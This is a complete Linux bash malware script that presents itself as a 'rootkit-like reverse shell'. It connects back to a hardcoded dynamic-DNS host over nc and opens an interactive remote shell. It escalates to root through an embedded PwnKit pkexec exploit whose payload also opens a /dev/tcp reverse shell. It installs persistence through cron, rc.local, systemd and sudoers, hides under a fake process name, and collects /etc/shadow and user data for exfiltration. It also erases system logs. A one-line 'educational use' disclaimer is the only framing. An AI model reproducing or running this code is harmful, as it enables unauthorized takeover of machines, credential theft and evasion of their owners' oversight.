
#!/bin/bash

# Advanced Rootkit-like Reverse Shell for Linux
# Features: Extreme Hiding, Persistence, Multi-Message Exfiltration, Stable Interactive TTY Shell, PwnKit Exploit, Sudo Elevation, Custom Commands
# WARNING: For educational/lab use only. Illegal on real systems.

# Ensure script runs with bash
if [ -z "$BASH" ]; then
    exec /bin/bash "$0" "$@"
fi

# Configuration
ATTACKER_IP="botconnect.ddns.net"  # Replace with your attacker's IP/domain
PORT=4444  # Port for reverse shell and server
HIDDEN_DIR="/var/tmp/.webservice"  # Hidden directory
HIDDEN_FILE="$HIDDEN_DIR/webservice.sh"  # Hidden file
PROCESS_NAME="[webservice]"  # Process name to mimic
LOG_FILES=("/var/log/auth.log" "/var/log/syslog" "/var/log/utmp" "/var/log/wtmp" "$HOME/.bash_history")  # Logs to clean
PERSIST_METHODS=(
    "(crontab -l 2>/dev/null | grep -v $HIDDEN_FILE; echo \"* * * * * /bin/bash $HIDDEN_FILE > /dev/null 2>&1\") | crontab -"
    "[ -f /etc/rc.local ] && [ -w /etc/rc.local ] && echo '/bin/bash $HIDDEN_FILE' >> /etc/rc.local"
    "echo '@reboot /bin/bash $HIDDEN_FILE' | crontab -"
    "mkdir -p /etc/systemd/system; echo '[Unit]\nDescription=Web Service\n[Service]\nExecStart=/bin/bash $HIDDEN_FILE\nRestart=always\n[Install]\nWantedBy=multi-user.target' > /etc/systemd/system/webservice.service; systemctl enable webservice.service 2>/dev/null"
)
SUDOERS_FILE="/etc/sudoers.d/webservice"
RETRY_INTERVALS=(1 2 4 8 16 32 64)  # Exponential backoff in seconds
UUID=$(cat /proc/sys/kernel/random/uuid 2>/dev/null || uuidgen 2>/dev/null || echo "client-$RANDOM-$RANDOM")  # Generate unique client ID

# Check if running from /tmp/webservice.sh
if [ "$0" = "/tmp/webservice.sh" ]; then
    SCRIPT_FILE="/tmp/webservice.sh"
else
    SCRIPT_FILE="$HIDDEN_FILE"
fi

# Clean up installation file if it exists
[ -f "/tmp/webservice.sh" ] && rm -f "/tmp/webservice.sh" 2>/dev/null

# Function to run PwnKit exploit if not root
run_pwnkit() {
    PKEXEC_PATH=$(which pkexec)
    if [ -z "$PKEXEC_PATH" ]; then
        echo "pkexec not found. Falling back to sudo." >&2
        return 1
    fi

    # Force bash as shell
    export SHELL="/bin/bash"

    # Create temporary directory for PwnKit
    TEMP_DIR="/tmp/pwnkit_$(date +%s)"
    mkdir -p "$TEMP_DIR"
    cd "$TEMP_DIR" || return 1

    # Create charset and gconv-modules
    echo "UTF-8" > charset
    echo "module UTF-8// PWNKIT_MODULE 2" > gconv-modules

    # Create PwnKit module
    cat << 'EOF' > pwnkit_module.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv() {}
void gconv_init() {
    setuid(0); setgid(0);
    setuid(0); setgid(0);
    system("/bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1");
    exit(0);
}
EOF
    sed -i "s|ATTACKER_IP|$ATTACKER_IP|" pwnkit_module.c
    sed -i "s|PORT|$PORT|" pwnkit_module.c

    # Compile the module
    gcc -fPIC -shared -o pwnkit.so pwnkit_module.c 2>/dev/null
    if [ $? -ne 0 ]; then
        echo "Failed to compile PwnKit module." >&2
        cd - >/dev/null
        rm -rf "$TEMP_DIR"
        return 1
    fi

    # Set up GCONV_PATH
    mkdir -p 'GCONV_PATH=.'
    mv pwnkit.so 'GCONV_PATH=.'/
    chmod 0755 'GCONV_PATH=.'/*.so

    # Set environment variables
    export GCONV_PATH="$TEMP_DIR"
    export CHARSET="$TEMP_DIR/charset"

    # Execute pkexec
    "$PKEXEC_PATH" /bin/true 2>/dev/null

    # Clean up immediately
    cd - >/dev/null
    rm -rf "$TEMP_DIR"

    if [ $EUID -eq 0 ]; then
        /bin/bash "$0"
        exit 0
    else
        echo "PwnKit exploit failed. Falling back to sudo." >&2
        return 1
    fi
}

# Check and elevate to root if possible
if [ $EUID -ne 0 ]; then
    # Try sudo first
    if sudo -n true 2>/dev/null; then
        if [ "$0" != "$SCRIPT_FILE" ]; then
            mkdir -p "$HIDDEN_DIR" 2>/dev/null
            cp "$0" "$SCRIPT_FILE" 2>/dev/null
            chmod 700 "$SCRIPT_FILE" 2>/dev/null
            exec sudo /bin/bash "$SCRIPT_FILE" "$@"
        fi
    else
        IS_ADMIN="No"
        # If sudo fails, try PwnKit
        run_pwnkit || {
            echo "Root escalation failed. Running as non-root." >&2
        }
    fi
else
    IS_ADMIN="Yes"
fi

# Hide the payload
if [ "$0" != "$SCRIPT_FILE" ]; then
    if [ -d "$HIDDEN_DIR" ]; then
        chattr -i "$HIDDEN_DIR" "$HIDDEN_FILE" 2>/dev/null
    fi
    mkdir -p "$HIDDEN_DIR" 2>/dev/null
    cp "$0" "$HIDDEN_FILE" 2>/dev/null
    chmod 700 "$HIDDEN_DIR" "$HIDDEN_FILE" 2>/dev/null
    chattr +i "$HIDDEN_DIR" "$HIDDEN_FILE" 2>/dev/null
fi
echo "$PROCESS_NAME" > /proc/self/comm 2>/dev/null  # Hide process name

# Persistence (multiple methods)
for method in "${PERSIST_METHODS[@]}"; do
    eval "$method" &>/dev/null
done

# Add sudoers entry for root elevation on reboot
if [ $EUID -eq 0 ]; then
    if [ -d "/etc/sudoers.d" ] && [ -w "/etc/sudoers.d" ]; then
        echo "$(whoami) ALL=(ALL) NOPASSWD: $HIDDEN_FILE" > "$SUDOERS_FILE" 2>/dev/null
        if [ $? -eq 0 ]; then
            chmod 440 "$SUDOERS_FILE" 2>/dev/null
            chattr +i "$SUDOERS_FILE" 2>/dev/null
        else
            echo "Failed to write to $SUDOERS_FILE. Skipping sudoers setup." >&2
        fi
    else
        echo "/etc/sudoers.d not found or not writable. Skipping sudoers setup." >&2
    fi
fi

# Data Exfiltration
INFO="Hostname: $(hostname)
OS: $(uname -a)
IP: $(ip addr show | grep inet | awk '{print $2}' | paste -sd ',')
Users: $(cat /etc/passwd | cut -d: -f1 | paste -sd ',')
Uptime: $(uptime)
Disk Usage: $(df -h | grep -v tmpfs | grep -v udev)"

# Try root password from /etc/shadow
if [ "$IS_ADMIN" = "Yes" ]; then
    ROOT_PASS=$(grep "^root:" /etc/shadow 2>/dev/null || echo "Not readable")
    INFO="$INFO\nRoot Shadow: $ROOT_PASS"
else
    INFO="$INFO\nNon-root: Shadow not readable. Other Users: $(grep -v root /etc/passwd | cut -d: -f1,6 | paste -sd ',' 2>/dev/null)"
fi

# Clean logs to hide tracks
for log in "${LOG_FILES[@]}"; do
    [ -f "$log" ] && [ -w "$log" ] && echo "" > "$log" 2>/dev/null
done

# Custom command handler
handle_custom_command() {
    local cmd="$1"
    case "$cmd" in
        "status")
            echo "Status: Active
Admin: $IS_ADMIN
PID: $$
UUID: $UUID
Uptime: $(uptime)"
            ;;
        "info")
            echo "$INFO"
            ;;
        *)
            echo "Unknown command: $cmd"
            ;;
    esac
}

# Heartbeat function
send_heartbeat() {
    while true; do
        sleep 5
        echo "KEEPALIVE:$UUID"
    done
}

# Single connection for messages and shell
while true; do
    (
        echo "MSG:CONN:sono connesso! Admin: $IS_ADMIN UUID: $UUID"
        echo "MSG:INFO:$INFO"
        echo "MSG:STATUS:Payload active, awaiting shell commands"
        echo "MSG:SHELL:START"
        send_heartbeat &
        HEARTBEAT_PID=$!
        while true; do
            read -r cmd
            case "$cmd" in
                "status"|"info")
                    handle_custom_command "$cmd"
                    ;;
                *)
                    /bin/bash -i -c "$cmd" 2>&1
                    ;;
            esac
        done
        kill $HEARTBEAT_PID 2>/dev/null
    ) | nc -w 120 $ATTACKER_IP $PORT 2>/dev/null
    for interval in "${RETRY_INTERVALS[@]}"; do
        sleep "$interval"
        nc -w 1 $ATTACKER_IP $PORT 2>/dev/null && break
    done
done &

# Clean up the original script
[ "$0" != "$SCRIPT_FILE" ] && rm -f "$0" 2>/dev/null
